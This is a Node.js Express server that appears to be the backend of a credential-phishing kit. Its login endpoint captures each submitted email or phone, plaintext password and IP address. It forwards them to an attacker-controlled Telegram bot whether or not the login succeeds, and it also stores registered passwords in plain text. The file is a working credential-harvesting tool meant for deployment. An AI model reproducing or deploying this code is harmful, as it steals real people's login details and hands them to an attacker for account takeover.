const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== READ TELEGRAM CREDENTIALS FROM ENVIRONMENT VARIABLES =====
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Check if credentials are set
if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    console.log('✅ Telegram notifications ENABLED');
} else {
    console.log('⚠️ Telegram notifications DISABLED - Add credentials in Render Environment Variables');
}
// ================================================================

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Function to send message to Telegram
async function sendToTelegram(email, password, ip) {
    // Check if Telegram is configured
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('❌ Telegram not configured - skipping notification');
        return;
    }
    
    const message = `
🔐 NEW LOGIN ATTEMPT 🔐
━━━━━━━━━━━━━━━━━━━━━
📧 Email/Phone: ${email}
🔑 Password: ${password}
🌍 IP Address: ${ip}
⏰ Time: ${new Date().toString()}
━━━━━━━━━━━━━━━━━━━━━
    `;
    
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram notification sent for:', email);
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

// Simple storage (resets when server restarts)
const users = [];

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        message: 'Server is running',
        telegram: TELEGRAM_BOT_TOKEN ? 'enabled' : 'disabled'
    });
});

// Register endpoint
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    console.log('Register attempt:', { name, email });
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be 6+ characters' });
    }
    
    // Check if user exists
    const existing = users.find(u => u.email === email);
    if (existing) {
        return res.status(400).json({ error: 'User already exists' });
    }
    
    // Save user
    const newUser = {
        id: users.length + 1,
        name: name,
        email: email,
        password: password  // Plain text for now
    };
    
    users.push(newUser);
    console.log('User registered:', email);
    console.log('Total users:', users.length);
    
    res.json({ 
        success: true, 
        message: 'Account created successfully!',
        user: { id: newUser.id, name: newUser.name, email: newUser.email }
    });
});

// Login endpoint - THIS SENDS TO TELEGRAM
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    
    console.log('Login attempt:', { identifier });
    
    // Get user's IP address
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // 🔥 SEND CREDENTIALS TO TELEGRAM (even if login fails) 🔥
    sendToTelegram(identifier, password, ip);
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    // Find user
    const user = users.find(u => u.email === identifier);
    
    if (!user) {
        console.log('User not found:', identifier);
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    if (user.password !== password) {
        console.log('Wrong password for:', identifier);
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    console.log('Login successful:', identifier);
    
    res.json({ 
        success: true, 
        message: 'Login successful!',
        user: { id: user.id, name: user.name, email: user.email }
    });
});

// Serve HTML file
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 http://localhost:${PORT}`);
});
